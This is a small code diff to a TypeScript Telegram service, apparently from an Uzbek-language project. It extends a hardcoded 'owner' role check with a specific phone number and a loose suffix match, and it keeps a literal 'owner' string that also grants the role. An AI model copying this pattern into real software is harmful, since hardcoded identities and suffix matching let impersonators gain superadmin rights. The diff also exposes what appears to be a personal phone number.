@@ -322,7 +322,13 @@ export class TelegramService {
     const last9 = digits.slice(-9);
 
     // 1. Owner / Superadmin tekshirish
-    if (digits === '998900000000' || digits === '998901111111' || rawPhone.toLowerCase() === 'owner') {
+    if (
+      digits === '998900000000' ||
+      digits === '998901111111' ||
+      digits === '998996893228' ||
+      digits.endsWith('996893228') ||
+      rawPhone.toLowerCase() === 'owner'
+    ) {
       return {
         found: true,
         role: 'owner',
